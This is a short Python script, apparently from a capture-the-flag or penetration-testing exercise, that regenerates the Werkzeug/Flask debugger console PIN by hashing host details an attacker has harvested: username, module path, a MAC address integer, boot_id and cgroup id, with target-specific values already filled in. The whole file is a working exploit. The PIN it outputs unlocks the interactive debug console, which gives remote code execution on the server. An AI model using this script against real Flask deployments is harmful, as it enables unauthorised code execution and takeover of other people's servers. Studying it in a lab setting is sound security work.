import hashlib
from itertools import chain

#! reference "https://www.daehee.com/werkzeug-console-pin-exploit/"

probably_public_bits = [
	'anonim',# username
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/home/anonim/.local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

# '2485377892354',# str(uuid.getnode()),  /sys/class/net/ens33/address
private_bits = [
	'2485378678789',# str(uuid.getnode()),  /sys/class/net/eth0/address -> convert to integer
]

# '88ca5e7b2819c56ffc2ab2fc4af49881e2b1c924a70c49d8f44113c9432b12219e374f1e47fdfd5fb0356780a5686e4e'# get_machine_id(), /etc/machine-id /
# e2b1c924a70c49d8f44113c9432b12219e374f1e47fdfd5fb0356780a5686e4e /proc/self/cgroup

idfrom_machine = '' # /etc/machine-id
idfrom_boot =  '0eb897c8-2ef2-42d6-ad91-b9bc318a09d4' # /proc/sys/kernel/random/boot_id

linux = ""
# machine-id is stable across boots, boot_id is not.

for filename in idfrom_machine, idfrom_boot:
	try:
		value = filename
	except OSError:
		continue

	if value:
		linux += value
		break

try:
	linux += "18c1805d57920940e85fc321bc81e27ca5b1a4e9562dd89027e1a8ca619e0585" # /proc/self/cgroup
except OSError:
	pass

private_bits.append(linux)

h = hashlib.sha1()

for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

# cookie_name = '__wzd' + h.hexdigest()[:20]
cookie_name = f"__wzd{h.hexdigest()[:20]}"

num = None
if num is None:
	h.update(b'pinsalt')
	# num = ('%09d' % int(h.hexdigest(), 16))[:9]
	num = f"{int(h.hexdigest(), 16):09d}"[:9]


rv =None	
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = "-".join(
				num[x : x + group_size].rjust(group_size, "0")
				for x in range(0, len(num), group_size)
			)
			break
	else:
		rv = num
print(rv)